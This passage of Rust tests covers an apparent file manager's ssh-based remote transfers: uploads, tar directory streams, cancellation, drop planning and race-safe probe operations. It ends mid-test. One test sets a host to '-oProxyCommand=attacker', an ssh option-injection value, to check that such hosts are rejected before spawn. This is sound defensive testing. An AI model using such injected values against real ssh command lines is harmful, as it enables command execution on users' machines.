        let root = unique_temp_dir("upload");
        let source = root.join("local.txt");
        let payload: Vec<u8> = (0..5_000u32).map(|index| (index % 253) as u8).collect();
        std::fs::write(&source, &payload).unwrap();

        let remote = root
            .join("remote/landed.txt")
            .to_string_lossy()
            .into_owned();
        std::fs::create_dir(root.join("remote")).unwrap();
        let argv = local_probe_argv("put", &[&remote]);
        stream_upload_to_probe(
            &argv,
            &source,
            64 * 1024,
            Duration::from_secs(10),
            TransferControl::default(),
        )
        .unwrap();
        assert_eq!(
            std::fs::read(root.join("remote/landed.txt")).unwrap(),
            payload
        );

        // The probe's exit 17 maps to AlreadyExists even though the local
        // writer then sees a broken pipe.
        let argv = local_probe_argv("put", &[&remote]);
        assert_eq!(
            stream_upload_to_probe(
                &argv,
                &source,
                64 * 1024,
                Duration::from_secs(10),
                TransferControl::default()
            )
            .unwrap_err()
            .kind(),
            io::ErrorKind::AlreadyExists
        );

        // A source over the cap is refused before the probe is even spawned.
        let argv = local_probe_argv("put", &[&root.join("remote/other").to_string_lossy()]);
        let error = stream_upload_to_probe(
            &argv,
            &source,
            1_024,
            Duration::from_secs(10),
            TransferControl::default(),
        )
        .unwrap_err();
        assert!(error.to_string().contains("limit"), "{error}");
        assert!(!root.join("remote/other").exists());

        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn directory_streams_round_trip_through_tar() {
        if local_tar_available().is_err() {
            return;
        }
        let root = unique_temp_dir("dir-transfer");
        std::fs::create_dir_all(root.join("tree/sub")).unwrap();
        std::fs::write(root.join("tree/a.txt"), b"aaa").unwrap();
        std::fs::write(root.join("tree/sub/b.bin"), [9u8, 8, 7, 0]).unwrap();

        // "Upload": local tar -> probe untar into the remote parent dir,
        // which creates `<parent>/tree` itself (v3 argv: dir + name).
        std::fs::create_dir_all(root.join("remote")).unwrap();
        let remote_dir = root.join("remote/tree");
        let local_argv = local_tar_create_argv(&root.join("tree")).unwrap();
        let remote_argv =
            local_probe_argv("untar", &[&root.join("remote").to_string_lossy(), "tree"]);
        stream_upload_dir(
            &local_argv,
            &remote_argv,
            64 * 1024 * 1024,
            Duration::from_secs(30),
            TransferControl::default(),
        )
        .unwrap();
        assert_eq!(std::fs::read(remote_dir.join("a.txt")).unwrap(), b"aaa");
        assert_eq!(
            std::fs::read(remote_dir.join("sub/b.bin")).unwrap(),
            [9u8, 8, 7, 0]
        );

        // A second upload of the same tree is refused atomically: untar's
        // exit 17 surfaces as AlreadyExists, and nothing is overwritten.
        let remote_argv =
            local_probe_argv("untar", &[&root.join("remote").to_string_lossy(), "tree"]);
        assert_eq!(
            stream_upload_dir(
                &local_argv,
                &remote_argv,
                64 * 1024 * 1024,
                Duration::from_secs(30),
                TransferControl::default(),
            )
            .unwrap_err()
            .kind(),
            io::ErrorKind::AlreadyExists
        );
        assert_eq!(std::fs::read(remote_dir.join("a.txt")).unwrap(), b"aaa");

        // "Download": probe tar -> local tar into the dst parent.
        let dst = root.join("local-back/tree");
        std::fs::create_dir(root.join("local-back")).unwrap();
        let probe_argv = local_probe_argv("tar", &[&remote_dir.to_string_lossy()]);
        let local_argv = vec![
            "tar".to_string(),
            "xf".to_string(),
            "-".to_string(),
            "-C".to_string(),
            root.join("local-back").to_string_lossy().into_owned(),
        ];
        stream_download_dir(
            &probe_argv,
            &local_argv,
            64 * 1024 * 1024,
            Duration::from_secs(30),
            TransferControl::default(),
        )
        .unwrap();
        assert_eq!(std::fs::read(dst.join("a.txt")).unwrap(), b"aaa");
        assert_eq!(
            std::fs::read(dst.join("sub/b.bin")).unwrap(),
            [9u8, 8, 7, 0]
        );

        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn transfer_plan_covers_all_location_pairs() {
        assert_eq!(transfer_plan(&FsLocation::Local, &FsLocation::Local), None);
        assert_eq!(
            transfer_plan(&FsLocation::Remote(1), &FsLocation::Remote(1)),
            None
        );
        assert_eq!(
            transfer_plan(&FsLocation::Remote(1), &FsLocation::Local),
            Some(TransferPlan::Download)
        );
        assert_eq!(
            transfer_plan(&FsLocation::Local, &FsLocation::Remote(2)),
            Some(TransferPlan::Upload)
        );
        assert_eq!(
            transfer_plan(&FsLocation::Remote(1), &FsLocation::Remote(2)),
            Some(TransferPlan::Relay)
        );
    }

    #[test]
    fn transfer_rejects_same_location() {
        let hosts: &[RemoteHost] = &[];
        assert_eq!(
            transfer(
                &FsLocation::Local,
                hosts,
                Path::new("/tmp/a"),
                &FsLocation::Local,
                Path::new("/tmp/b"),
                false,
                &TransferControl::default(),
            )
            .unwrap_err()
            .kind(),
            io::ErrorKind::InvalidInput
        );
    }

    #[test]
    fn copy_then_delete_orders_copy_first_and_reports_partial_success() {
        use std::sync::{Arc, Mutex};

        let log = Arc::new(Mutex::new(Vec::new()));
        let recorder = |log: &Arc<Mutex<Vec<&'static str>>>, tag: &'static str, ok: bool| {
            let log = log.clone();
            move || {
                log.lock().unwrap().push(tag);
                if ok {
                    Ok(())
                } else {
                    Err(io::Error::other("boom"))
                }
            }
        };

        // Happy path: copy runs first, delete second.
        copy_then_delete(recorder(&log, "copy", true), recorder(&log, "delete", true)).unwrap();
        assert_eq!(*log.lock().unwrap(), vec!["copy", "delete"]);

        // A failed copy never reaches the delete.
        log.lock().unwrap().clear();
        assert!(copy_then_delete(
            recorder(&log, "copy", false),
            recorder(&log, "delete", true)
        )
        .is_err());
        assert_eq!(*log.lock().unwrap(), vec!["copy"]);

        // A failed delete is reported as partial success, not as a copy failure.
        log.lock().unwrap().clear();
        let error = copy_then_delete(
            recorder(&log, "copy", true),
            recorder(&log, "delete", false),
        )
        .unwrap_err();
        assert_eq!(*log.lock().unwrap(), vec!["copy", "delete"]);
        assert!(
            error
                .to_string()
                .contains("copied, but the source could not be deleted"),
            "{error}"
        );
    }

    #[test]
    fn human_bytes_formats_compact_counts() {
        assert_eq!(human_bytes(0), "0 B");
        assert_eq!(human_bytes(512), "512 B");
        assert_eq!(human_bytes(1023), "1023 B");
        assert_eq!(human_bytes(1024), "1.0 KiB");
        assert_eq!(human_bytes(1536), "1.5 KiB");
        assert_eq!(human_bytes(13_002_342), "12.4 MiB");
        assert_eq!(human_bytes(512 * 1024 * 1024), "512.0 MiB");
        assert_eq!(human_bytes(1024 * 1024 * 1024), "1.0 GiB");
        assert_eq!(human_bytes(u64::MAX), "16777216.0 TiB");
    }

    #[test]
    fn progress_throttle_bounds_rate_and_step() {
        let start = std::time::Instant::now();
        let mut throttle = ProgressThrottle::new();
        // The first report always goes through.
        assert!(throttle.should_emit(start, 0));
        // Immediately after, neither enough time nor enough bytes.
        assert!(!throttle.should_emit(start + Duration::from_millis(10), 1));
        // A big enough byte step emits even without waiting.
        assert!(throttle.should_emit(start + Duration::from_millis(10), PROGRESS_MIN_STEP));
        // Small steps are withheld until the interval passes...
        assert!(!throttle.should_emit(start + Duration::from_millis(20), PROGRESS_MIN_STEP + 1));
        // ...then the interval alone is enough.
        assert!(throttle.should_emit(
            start + Duration::from_millis(20) + PROGRESS_MIN_INTERVAL,
            PROGRESS_MIN_STEP + 1
        ));
        // The exact boundary counts: 256 KiB is emitted, one byte less is not.
        let mut throttle = ProgressThrottle::new();
        assert!(throttle.should_emit(start, 0));
        assert!(!throttle.should_emit(start + Duration::from_millis(10), PROGRESS_MIN_STEP - 1));
        let mut throttle = ProgressThrottle::new();
        assert!(throttle.should_emit(start, 100));
        assert!(throttle.should_emit(start + Duration::from_millis(10), 100 + PROGRESS_MIN_STEP));
    }

    #[test]
    fn cancel_kills_the_transfer_and_cleans_up_partial_download() {
        let root = unique_temp_dir("cancel-dl");
        // A child that never produces output: without the cancel-kill this
        // would run until the (generous) timeout.
        let argv = vec![
            "sh".to_string(),
            "-c".to_string(),
            "exec sleep 30".to_string(),
        ];
        let control = TransferControl::default();
        let token = control.token.clone();
        std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(120));
            token.cancel();
        });
        let started = std::time::Instant::now();
        let error = stream_download_to_file(
            &argv,
            &root.join("out.bin"),
            64 * 1024,
            Duration::from_secs(60),
            control,
        )
        .unwrap_err();
        assert_eq!(error.kind(), io::ErrorKind::Interrupted, "{error}");
        assert!(
            started.elapsed() < Duration::from_secs(10),
            "cancel did not kill the child promptly"
        );
        assert!(!root.join("out.bin").exists());
        let leftovers: Vec<_> = std::fs::read_dir(&root)
            .unwrap()
            .flatten()
            .map(|entry| entry.file_name().to_string_lossy().into_owned())
            .filter(|name| name.contains("fspart"))
            .collect();
        assert!(leftovers.is_empty(), "leftover temp files: {leftovers:?}");

        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn cancel_before_start_and_after_finish_are_harmless() {
        let root = unique_temp_dir("cancel-race");
        std::fs::write(root.join("src.txt"), b"payload").unwrap();
        let src = root.join("src.txt").to_string_lossy().into_owned();

        // Pre-cancelled token: the transfer refuses to start.
        let control = TransferControl::default();
        control.token.cancel();
        let argv = local_probe_argv("cat", &[&src]);
        assert_eq!(
            stream_download_to_file(
                &argv,
                &root.join("a.bin"),
                64 * 1024,
                Duration::from_secs(10),
                control,
            )
            .unwrap_err()
            .kind(),
            io::ErrorKind::Interrupted
        );
        assert!(!root.join("a.bin").exists());

        // Cancel after a successful transfer is a no-op.
        let control = TransferControl::default();
        let argv = local_probe_argv("cat", &[&src]);
        stream_download_to_file(
            &argv,
            &root.join("b.bin"),
            64 * 1024,
            Duration::from_secs(10),
            control.clone(),
        )
        .unwrap();
        control.token.cancel();
        assert_eq!(std::fs::read(root.join("b.bin")).unwrap(), b"payload");

        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn cancel_upload_kills_and_reports_interrupted() {
        let root = unique_temp_dir("cancel-ul");
        let source = root.join("big.bin");
        std::fs::write(&source, vec![7u8; 4 * 1024 * 1024]).unwrap();
        // The remote end never reads stdin: the writer blocks and only a
        // cancel can end the transfer.
        let argv = vec![
            "sh".to_string(),
            "-c".to_string(),
            "exec sleep 30".to_string(),
        ];
        let control = TransferControl::default();
        let token = control.token.clone();
        std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(120));
            token.cancel();
        });
        let started = std::time::Instant::now();
        let error = stream_upload_to_probe(
            &argv,
            &source,
            64 * 1024 * 1024,
            Duration::from_secs(60),
            control,
        )
        .unwrap_err();
        assert_eq!(error.kind(), io::ErrorKind::Interrupted, "{error}");
        assert!(
            started.elapsed() < Duration::from_secs(10),
            "cancel did not kill the child promptly"
        );

        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn progress_sink_receives_throttled_updates_and_exact_total() {
        use std::sync::{Arc, Mutex};
        let root = unique_temp_dir("progress");
        let source = root.join("source.bin");
        let payload = vec![3u8; 600 * 1024];
        std::fs::write(&source, &payload).unwrap();
        let source_arg = source.to_string_lossy().into_owned();

        let reports: Arc<Mutex<Vec<u64>>> = Arc::new(Mutex::new(Vec::new()));
        let reports_for_sink = reports.clone();
        let control = TransferControl {
            token: CancelToken::default(),
            progress: Some(Arc::new(Mutex::new(move |bytes: u64| {
                reports_for_sink.lock().unwrap().push(bytes);
            }))),
        };
        let argv = local_probe_argv("cat", &[&source_arg]);
        stream_download_to_file(
            &argv,
            &root.join("out.bin"),
            64 * 1024 * 1024,
            Duration::from_secs(10),
            control,
        )
        .unwrap();

        let reports = reports.lock().unwrap();
        assert!(!reports.is_empty());
        // The exact total always lands, last.
        assert_eq!(*reports.last().unwrap(), payload.len() as u64);
        // Reports are monotonically non-decreasing.
        assert!(reports.windows(2).all(|pair| pair[0] <= pair[1]));

        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn drop_plan_dispatches_copy_or_upload_with_collision_flags() {
        let root = unique_temp_dir("drop-plan");
        std::fs::write(root.join("file.txt"), b"12345").unwrap();
        std::fs::create_dir(root.join("dir")).unwrap();
        std::fs::write(root.join("dir/inner.txt"), b"678").unwrap();
        let paths = vec![root.join("file.txt"), root.join("dir")];
        let target_dir = PathBuf::from("/target");

        let plan = plan_drop(&paths, &FsLocation::Local, &target_dir);
        let DropPlan::Import {
            items,
            action,
            total_bytes,
        } = plan
        else {
            panic!("expected an import plan");
        };
        assert_eq!(action, DropAction::Copy);
        assert_eq!(total_bytes, 5 + 3);
        assert_eq!(items.len(), 2);
        assert_eq!(items[0].dst, target_dir.join("file.txt"));
        assert!(!items[0].is_dir);
        assert_eq!(items[0].size, 5);
        assert!(!items[0].collides);
        assert_eq!(items[1].dst, target_dir.join("dir"));
        assert!(items[1].is_dir);
        assert_eq!(items[1].size, 3);

        // A pre-existing destination is flagged (Local target only).
        let existing = root.join("file.txt");
        let plan = plan_drop(&[existing], &FsLocation::Local, &root);
        let DropPlan::Import { items, .. } = plan else {
            panic!("expected an import plan");
        };
        assert!(items[0].collides);

        // Remote targets plan uploads; collisions are the probe's business.
        let plan = plan_drop(&paths, &FsLocation::Remote(2), &target_dir);
        let DropPlan::Import { items, action, .. } = plan else {
            panic!("expected an import plan");
        };
        assert_eq!(action, DropAction::Upload);
        assert!(items.iter().all(|item| !item.collides));

        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn drop_plan_refuses_malformed_and_oversized_drops() {
        let root = unique_temp_dir("drop-refuse");

        assert_eq!(
            plan_drop(&[], &FsLocation::Local, &root),
            DropPlan::Refuse("Nothing to import.".to_string())
        );
        assert_eq!(
            plan_drop(&[PathBuf::from("relative/file")], &FsLocation::Local, &root),
            DropPlan::Refuse("Only absolute local paths can be imported.".to_string())
        );
        assert_eq!(
            plan_drop(&[PathBuf::from("/")], &FsLocation::Local, &root),
            DropPlan::Refuse("Cannot import a filesystem root.".to_string())
        );

        // Too many top-level items.
        let many: Vec<PathBuf> = (0..MAX_DROP_ITEMS + 1)
            .map(|index| root.join(format!("item-{index}")))
            .collect();
        assert!(matches!(
            plan_drop(&many, &FsLocation::Local, &root),
            DropPlan::Refuse(reason) if reason.contains("Too many")
        ));

        // Over the byte cap (a sparse file: large length, no real blocks).
        let big = root.join("big.bin");
        std::fs::File::create(&big)
            .unwrap()
            .set_len(MAX_TRANSFER_BYTES + 1)
            .unwrap();
        assert!(matches!(
            plan_drop(&[big], &FsLocation::Local, &root),
            DropPlan::Refuse(reason) if reason.contains("limit")
        ));

        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn drop_size_walk_is_bounded_and_never_follows_symlinks() {
        let root = unique_temp_dir("drop-walk");
        std::fs::create_dir(root.join("real")).unwrap();
        std::fs::write(root.join("real/data.bin"), [0u8; 100]).unwrap();
        // A symlink to a directory contributes nothing and is not descended.
        std::os::unix::fs::symlink(root.join("real"), root.join("link")).unwrap();
        assert_eq!(drop_entry_size(&root.join("link"), 0), 0);
        assert_eq!(drop_entry_size(&root.join("real"), 0), 100);

        // A chain deeper than the depth cap stops counting.
        let mut deep = root.join("deep");
        for level in 0..MAX_DROP_WALK_DEPTH + 4 {
            deep = deep.join(format!("d{level}"));
        }
        std::fs::create_dir_all(&deep).unwrap();
        std::fs::write(deep.join("bottom.txt"), [0u8; 10]).unwrap();
        let walked = drop_entry_size(&root.join("deep"), 0);
        assert_eq!(walked, 0, "beyond-depth content must not be counted");

        // Unreadable/vanished paths count as zero instead of failing.
        assert_eq!(drop_entry_size(&root.join("missing"), 0), 0);

        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn production_probe_gate_rejects_invalid_runtime_hosts_before_spawn() {
        let mut host = host_fixture();
        host.host = "-oProxyCommand=attacker".to_string();
        assert_eq!(
            FsLocation::Remote(0).label(std::slice::from_ref(&host)),
            "Remote (unavailable)"
        );
        let error = checked_probe_argv(&host, "home", &[]).unwrap_err();
        assert_eq!(error.kind(), io::ErrorKind::InvalidInput);

        let hosts = vec![host_fixture(); crate::config::MAX_REMOTE_HOSTS + 1];
        let error =
            remote_host(&FsLocation::Remote(crate::config::MAX_REMOTE_HOSTS), &hosts).unwrap_err();
        assert_eq!(error.kind(), io::ErrorKind::InvalidInput);
    }

    #[test]
    fn transient_targets_use_the_same_final_execution_gate() {
        let target = transient_fixture();
        let location = FsLocation::Transient(target.clone());
        assert_eq!(
            location.label(&[]),
            "ssh: alice@dev.example.com (temporary)"
        );
        let resolved = remote_host(&location, &[]).unwrap().unwrap();
        assert_eq!(resolved.host, "dev.example.com");
        assert_eq!(resolved.user.as_deref(), Some("alice"));
        assert_eq!(resolved.ssh_args, ["-p", "2222"]);
        assert!(!resolved.multiplex);

        let mut unsafe_target = target;
        unsafe_target.ssh_args = vec!["--".to_string()];
        let error = remote_host(&FsLocation::Transient(unsafe_target), &[]).unwrap_err();
        assert_eq!(error.kind(), io::ErrorKind::InvalidInput);
    }

    #[test]
    fn transient_locations_participate_in_transfer_plans_as_remote() {
        let transient = FsLocation::Transient(transient_fixture());
        assert_eq!(
            transfer_plan(&FsLocation::Local, &transient),
            Some(TransferPlan::Upload)
        );
        assert_eq!(
            transfer_plan(&transient, &FsLocation::Local),
            Some(TransferPlan::Download)
        );
        let other = FsLocation::Transient(RemoteHostConfig {
            host: "other.example.com".to_string(),
            name: "other.example.com".to_string(),
            ..transient_fixture()
        });
        assert_eq!(transfer_plan(&transient, &other), Some(TransferPlan::Relay));
    }

    #[test]
    fn saved_and_temporary_control_paths_share_one_filesystem_namespace() {
        let target = transient_fixture();
        let transient = FsLocation::Transient(target.clone());
        let mut saved = host_fixture();
        saved.ssh_args.extend([
            "-o".to_string(),
            "ControlPath=/run/user/1000/saved-cm".to_string(),
        ]);
        let hosts = vec![saved];
        assert!(same_filesystem(&transient, &FsLocation::Remote(0), &hosts));
        assert_eq!(
            transfer_plan_with_hosts(&transient, &FsLocation::Remote(0), &hosts),
            None,
            "same-host paste must use copy/rename instead of a relay"
        );

        let raw_target = RemoteHostConfig {
            ssh_args: vec![
                "-p".to_string(),
                "2222".to_string(),
                "-S".to_string(),
                "/run/user/1000/live-cm".to_string(),
            ],
            ..target
        };
        let (stable_target, overlay) = observed_target_and_overlay(raw_target, None).unwrap();
        assert_eq!(stable_target.ssh_args, ["-p", "2222"]);
        let execution = remote_host_with_overlay(&FsLocation::Remote(0), &hosts, &overlay)
            .unwrap()
            .unwrap();
        assert!(execution
            .ssh_args
            .windows(2)
            .any(|pair| { pair == ["-S".to_string(), "/run/user/1000/live-cm".to_string()] }));
        assert!(!execution
            .ssh_args
            .iter()
            .any(|arg| arg.contains("saved-cm")));

        let (jsh_target, jsh_overlay) = observed_target_and_overlay(
            transient_fixture(),
            Some("/run/user/1000/current-jsh-cm".to_string()),
        )
        .unwrap();
        assert_eq!(jsh_target.ssh_args, ["-p", "2222"]);
        let jsh_execution = remote_host_with_overlay(&FsLocation::Remote(0), &hosts, &jsh_overlay)
            .unwrap()
            .unwrap();
        assert!(jsh_execution.ssh_args.windows(2).any(|pair| {
            pair == [
                "-S".to_string(),
                "/run/user/1000/current-jsh-cm".to_string(),
            ]
        }));
        assert!(!jsh_execution
            .ssh_args
            .iter()
            .any(|arg| arg.contains("saved-cm")));

        let live_location = FsLocation::Transient(stable_target);
        let saved_location = FsLocation::Remote(0);
        let empty = FsExecutionOverlay::default();
        let (selected_location, selected_overlay) = same_filesystem_execution_endpoint(
            &live_location,
            &overlay,
            &saved_location,
            &empty,
            &hosts,
        );
        assert_eq!(selected_location, &live_location);
        assert_eq!(selected_overlay, &overlay);

        let (selected_location, selected_overlay) = same_filesystem_execution_endpoint(
            &saved_location,
            &empty,
            &live_location,
            &overlay,
            &hosts,
        );
        assert_eq!(selected_location, &live_location);
        assert_eq!(selected_overlay, &overlay);

        let mut saved_without_socket = host_fixture();
        saved_without_socket.name = "saved without socket".to_string();
        let two_saved_hosts = vec![hosts[0].clone(), saved_without_socket];
        let source_with_socket = FsLocation::Remote(0);
        let destination_without_socket = FsLocation::Remote(1);
        assert!(same_filesystem(
            &source_with_socket,
            &destination_without_socket,
            &two_saved_hosts,
        ));
        let (selected_location, selected_overlay) = same_filesystem_execution_endpoint(
            &source_with_socket,
            &empty,
            &destination_without_socket,
            &empty,
            &two_saved_hosts,
        );
        assert_eq!(selected_location, &source_with_socket);
        assert!(selected_overlay.is_empty());
    }
}

#[cfg(test)]
mod transport_regressions {
    use super::*;
    struct Temp(PathBuf);
    impl Temp {
        fn new() -> Self {
            static NEXT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
            let path = std::env::temp_dir().join(format!(
                "gtk-fs-audit-{}-{}",
                std::process::id(),
                NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
            ));
            std::fs::create_dir(&path).unwrap();
            Self(path)
        }
    }
    impl Drop for Temp {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }
    fn code(capture: &Capture) -> i32 {
        capture.status
    }
    fn capture(args: &[&str], input: &[u8], timeout: Duration) -> io::Result<Capture> {
        run_capture(
            &args.iter().map(|s| (*s).into()).collect::<Vec<_>>(),
            input,
            timeout,
            2 * 1024 * 1024,
        )
    }
    fn probe(script: &str, args: &[&str], input: &[u8]) -> Capture {
        let mut argv = vec!["sh", "-c", script, "probe"];
        argv.extend(args);
        capture(&argv, input, Duration::from_secs(5)).unwrap()
    }
    fn race_after_check(op: &str, race: &str) -> String {
        let marker = format!("  {op})\n");
        let start = PROBE_SCRIPT.find(&marker).unwrap();
        let tail = &PROBE_SCRIPT[start..];
        let check = if tail.starts_with("  mkfile)") {
            if tail.contains("    [ -e \"$p\" ] && exit 17") {
                "    [ -e \"$p\" ] && exit 17"
            } else {
                "    if [ -e \"$p\" ] || [ -L \"$p\" ]; then exit 17; fi"
            }
        } else if tail.contains("    [ -e \"$n\" ] && exit 17") {
            "    [ -e \"$n\" ] && exit 17"
        } else {
            "    if [ -e \"$n\" ] || [ -L \"$n\" ]; then exit 17; fi"
        };
        let offset = start + tail.find(check).unwrap() + check.len();
        format!(
            "{}\n    {}{}",
            &PROBE_SCRIPT[..offset],
            race,
            &PROBE_SCRIPT[offset..]
        )
    }
    #[test]
    fn local_copy_refuses_existing_regular_file_and_dangling_link() {
        let root = Temp::new();
        let src = root.0.join("source");
        let dst = root.0.join("target");
        std::fs::write(&src, b"source").unwrap();
        std::fs::write(&dst, b"keep").unwrap();
        assert_eq!(
            copy_recursive(&src, &dst, 0).unwrap_err().kind(),
            io::ErrorKind::AlreadyExists
        );
        assert_eq!(std::fs::read(&dst).unwrap(), b"keep");
        std::fs::remove_file(&dst).unwrap();
        let missing = root.0.join("missing");
        std::os::unix::fs::symlink(&missing, &dst).unwrap();
        assert_eq!(
            copy_recursive(&src, &dst, 0).unwrap_err().kind(),
            io::ErrorKind::AlreadyExists
        );
        assert!(!missing.exists());
    }
    #[test]
    fn directory_upload_does_not_start_remote_after_tar_failure() {
        let root = Temp::new();
        let marker = root.0.join("remote-started");
        let local = vec![
            "sh".into(),
            "-c".into(),
            "printf archive-prefix; exit 1".into(),
        ];
        let remote = vec![
            "sh".into(),
            "-c".into(),
            format!("touch {}; cat >/dev/null", sq(marker.to_str().unwrap())),
        ];
        assert!(stream_upload_dir(
            &local,
            &remote,
            1024,
            Duration::from_secs(2),
            TransferControl::default()
        )
        .is_err());
        assert!(
            !marker.exists(),
            "failed archive must not reach a remote publisher"
        );
    }

    #[test]
    fn remote_untar_refuses_a_destination_created_during_extraction() {
        let root = Temp::new();
        let src = root.0.join("tree");
        let dst = root.0.join("destination");
        std::fs::create_dir(&src).unwrap();
        std::fs::create_dir(&dst).unwrap();
        std::fs::write(src.join("kept"), b"new").unwrap();
        let archive = probe(PROBE_SCRIPT, &["tar", src.to_str().unwrap()], b"");
        assert_eq!(code(&archive), 0);
        let script = PROBE_SCRIPT.replace(
            "    tar xf -",
            "    mkdir \"$d/$n\"; printf keep > \"$d/$n/kept\"\n    tar xf -",
        );
        let result = probe(
            &script,
            &["untar", dst.to_str().unwrap(), "tree"],
            &archive.stdout,
        );
        assert_eq!(code(&result), 17);
        assert_eq!(std::fs::read(dst.join("tree/kept")).unwrap(), b"keep");
    }
    #[test]
    fn local_tar_treats_option_like_basename_as_a_name() {
        let root = Temp::new();
        let src = root.0.join("--help");
        std::fs::create_dir(&src).unwrap();
        let argv = local_tar_create_argv(&src).unwrap();
        let result = run_capture(&argv, b"", Duration::from_secs(2), 1024 * 1024).unwrap();
        assert_eq!(code(&result), 0);
        assert_eq!(&result.stdout[257..262], b"ustar");
    }
    #[test]
    fn remote_put_refuses_a_destination_created_at_publication() {
        let root = Temp::new();
        let target = root.0.join("target");
        let script = if PROBE_SCRIPT.contains("    if ! ln -T") {
            PROBE_SCRIPT.replace("    if ! ln -T", "    printf keep > \"$p\"\n    if ! ln -T")
        } else {
            PROBE_SCRIPT.replace(
                "    mv \"$t\" \"$p\"",
                "    printf keep > \"$p\"\n    mv \"$t\" \"$p\"",
            )
        };
        let result = probe(&script, &["put", target.to_str().unwrap()], b"new");
        assert_eq!(code(&result), 17);
        assert_eq!(std::fs::read(target).unwrap(), b"keep");
    }
    #[test]
    fn remote_mkfile_refuses_a_creator_after_its_precheck() {
        let root = Temp::new();
        let target = root.0.join("target");
        let script = race_after_check("mkfile", "printf keep > \"$p\"");
        let result = probe(&script, &["mkfile", target.to_str().unwrap()], b"");
        assert_eq!(code(&result), 17);
        assert_eq!(std::fs::read(target).unwrap(), b"keep");
    }
    #[test]
    fn remote_move_and_copy_refuse_raced_destinations() {
        let root = Temp::new();
        let source = root.0.join("source");
        let target = root.0.join("target");
        std::fs::write(&source, b"source").unwrap();
        for op in ["mv", "cp"] {
            let script = race_after_check(op, "printf keep > \"$n\"");
            let result = probe(
                &script,
                &[op, source.to_str().unwrap(), target.to_str().unwrap()],
                b"",
            );
            assert_eq!(code(&result), 17, "operation {op}");
            assert_eq!(std::fs::read(&source).unwrap(), b"source");
            assert_eq!(std::fs::read(&target).unwrap(), b"keep");
            std::fs::remove_file(&target).unwrap();
        }
    }
    #[test]
    fn capture_retires_inherited_pipes_when_the_leader_exits() {
        let started = std::time::Instant::now();
        let result = capture(
            &["sh", "-c", "sleep 2 & printf complete"],
            b"",
            Duration::from_secs(4),
        )
        .unwrap();
        assert_eq!(code(&result), 0);
        assert_eq!(result.stdout, b"complete");
        assert!(
            started.elapsed() < Duration::from_secs(1),
            "capture waited for an orphaned group member"
        );
    }
    #[test]
    fn capture_bounds_escaped_pipe_holders_after_leader_exit() {
        let started = std::time::Instant::now();
        let result = capture(
            &[
                "sh",
                "-c",
                "setsid sh -c 'sleep 2' <&0 & sleep 0.05; exit 0",
            ],
            b"",
            Duration::from_secs(4),
        );
        assert!(
            result.is_err(),
            "an incomplete inherited pipe must not be accepted"
        );
        assert!(started.elapsed() < Duration::from_secs(1));
    }
    #[test]
    fn capture_stdin_delivery_obeys_timeout_with_a_nonreading_child() {
        let started = std::time::Instant::now();
        let error = capture(
            &["sh", "-c", "sleep 2"],
            &vec![b'x'; 1024 * 1024],
            Duration::from_millis(100),
        )
        .unwrap_err();
        assert_eq!(error.kind(), io::ErrorKind::TimedOut);
        assert!(started.elapsed() < Duration::from_secs(1));
    }
    #[test]
    fn streaming_download_and_upload_bound_escaped_pipe_holders() {
        let root = Temp::new();
        let src = root.0.join("source");
        let dst = root.0.join("target");
        std::fs::write(&src, vec![b'x'; 1024 * 1024]).unwrap();
        let argv = vec![
            "sh".into(),
            "-c".into(),
            "setsid sh -c 'sleep 2' <&0 & sleep 0.05; exit 0".into(),
        ];
        let started = std::time::Instant::now();
        assert!(stream_download_to_file(
            &argv,
            &dst,
            2 * 1024 * 1024,
            Duration::from_secs(4),
            TransferControl::default()
        )
        .is_err());
        assert!(!dst.exists());
        assert!(started.elapsed() < Duration::from_secs(1));
        let started = std::time::Instant::now();
        assert!(stream_upload_to_probe(
            &argv,
            &src,
            2 * 1024 * 1024,
            Duration::from_secs(4),
            TransferControl::default()
        )
        .is_err());
        assert!(started.elapsed() < Duration::from_secs(1));
    }
    #[test]
    fn cancelled_streaming_download_does_not_wait_for_an_escaped_holder() {
        let root = Temp::new();
        let target = root.0.join("target");
        let control = TransferControl::default();
        let token = control.token.clone();
        let canceller = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(100));
            token.cancel();
        });
        let argv = vec![
            "sh".into(),
            "-c".into(),
            "setsid sh -c 'sleep 2' & sleep 2".into(),
        ];
        let started = std::time::Instant::now();
        let error = stream_download_to_file(&argv, &target, 1024, Duration::from_secs(4), control)
            .unwrap_err();
        canceller.join().unwrap();
        assert_eq!(error.kind(), io::ErrorKind::Interrupted);
        assert!(!target.exists());
        assert!(started.elapsed() < Duration::from_secs(1));
    }
    fn atomic_program() -> &'static str {
        PROBE_SCRIPT
            .split_once("rename_program='")
            .unwrap()
            .1
            .split_once("'\nrequire_noreplace_rename")
            .unwrap()
            .0
    }
    #[test]
    fn remote_atomic_rename_fails_closed_without_python() {
        let root = Temp::new();
        let src = root.0.join("source");
        let dst = root.0.join("target");
        std::fs::write(&src, b"source").unwrap();
        let path = format!("PATH={}", root.0.display());
        let result = capture(
            &[
                "/usr/bin/env",
                &path,
                "/bin/sh",
                "-c",
                PROBE_SCRIPT,
                "probe",
                "mv",
                src.to_str().unwrap(),
                dst.to_str().unwrap(),
            ],
            b"",
            Duration::from_secs(5),
        )
        .unwrap();
        assert_eq!(code(&result), 4);
        assert!(String::from_utf8_lossy(&result.stderr).contains("requires Python 3"));
        assert_eq!(std::fs::read(src).unwrap(), b"source");
        assert!(!dst.exists());
    }
    #[test]
    fn remote_atomic_rename_preserves_files_when_syscall_is_unsupported() {
        let root = Temp::new();
        let src = root.0.join("source");
        let dst = root.0.join("target");
        std::fs::write(&src, b"source").unwrap();
        std::fs::write(&dst, b"keep").unwrap();
        let path = format!("PYTHONPATH={}", root.0.display());
        for errno in [
            nix::libc::ENOSYS,
            nix::libc::EINVAL,
            nix::libc::EOPNOTSUPP,
